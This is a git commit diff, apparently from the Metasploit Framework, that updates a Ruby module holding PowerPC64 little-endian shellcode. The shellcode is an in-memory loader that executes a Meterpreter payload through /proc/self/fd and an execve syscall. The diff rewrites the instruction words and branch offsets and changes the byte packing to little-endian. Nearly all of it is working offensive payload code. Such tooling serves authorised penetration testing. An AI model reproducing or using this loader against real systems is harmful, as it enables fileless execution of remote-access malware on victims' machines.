63f8ccb110c53fb0ad97754acf71d4e4229415d6
Martin Sutovsky <martin_sutovsky@rapid7.com>
2025-02-13 17:56:58 +0100

    Code refactor, loader delivery update

--- lib/msf/core/payload/linux/ppc64le/meterpreter_loader.rb
+++ lib/msf/core/payload/linux/ppc64le/meterpreter_loader.rb
@@ -5,11 +5,10 @@
 # Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
 #
 
-module Msf::Payload::Linux::Ppc::MeterpreterLoader
+module Msf::Payload::Linux::Ppc64le::MeterpreterLoader
   def in_memory_loader(payload)
     in_memory_loader = [
-
-      0x48000084, # 0x1000:	b	0x1084	0x48000084
+      0x4800007c, # 0x1000:	b	0x107c	0x4800007c
       0x7de802a6, # 0x1004:	mflr	r15	0x7de802a6
       0x39c00000, # 0x1008:	li	r14, 0	0x39c00000
       0x95c10000, # 0x100c:	stwu	r14, 0(r1)	0x95c10000
@@ -31,25 +30,19 @@ module Msf::Payload::Linux::Ppc::MeterpreterLoader
       0x7eb48850, # 0x104c:	subf	r21, r20, r17	0x7eb48850
       0x3ab50030, # 0x1050:	addi	r21, r21, 0x30	0x3ab50030
       0x7e719b78, # 0x1054:	mr	r17, r19	0x7e719b78
-      0x7e078378, # 0x1058:	mr	r7, r16	0x7e078378
-      0x9aa70000, # 0x105c:	stb	r21, 0(r7)	0x9aa70000
-      0x22100001, # 0x1060:	subfic	r16, r16, 1	0x22100001
-      0x2c110000, # 0x1064:	cmpwi	r17, 0	0x2c110000
-      0x4082ffdc, # 0x1068:	bne	0x1044	0x4082ffdc
-      0x39efffe2, # 0x106c:	addi	r15, r15, -0x1e	0x39efffe2
-      0x7de37b78, # 0x1070:	mr	r3, r15	0x7de37b78
-      0x7ca52a78, # 0x1074:	xor	r5, r5, r5	0x7ca52a78
-      0x7c842278, # 0x1078:	xor	r4, r4, r4	0x7c842278
-      0x3800000b, # 0x107c:	li	r0, 0xb	0x3800000b
-      0x44000002, # 0x1080:	sc		0x44000002
-      0x4bffff81, # 0x1084:	bl	0x1004	0x4bffff81
-
+      0x96b0ffff, # 0x1058:	stwu	r21, -1(r16)	0x96b0ffff
+      0x2c110000, # 0x105c:	cmpwi	r17, 0	0x2c110000
+      0x4082ffe4, # 0x1060:	bne	0x1044	0x4082ffe4
+      0x39efffe2, # 0x1064:	addi	r15, r15, -0x1e	0x39efffe2
+      0x7de37b78, # 0x1068:	mr	r3, r15	0x7de37b78
+      0x7ca52a78, # 0x106c:	xor	r5, r5, r5	0x7ca52a78
+      0x7c842278, # 0x1070:	xor	r4, r4, r4	0x7c842278
+      0x3800000b, # 0x1074:	li	r0, 0xb	0x3800000b
+      0x44000002, # 0x1078:	sc		0x44000002
+      0x4bffff89, # 0x107c:	bl	0x1004	0x4bffff89
       payload.length
-    ].pack('N*')
-
+    ].pack('V*')
     fd_path = '/proc/self/fd/'.bytes.pack('C*') + "\x2f" * 14 + "\x00" * 2
     in_memory_loader+fd_path
   end
-
 end
-
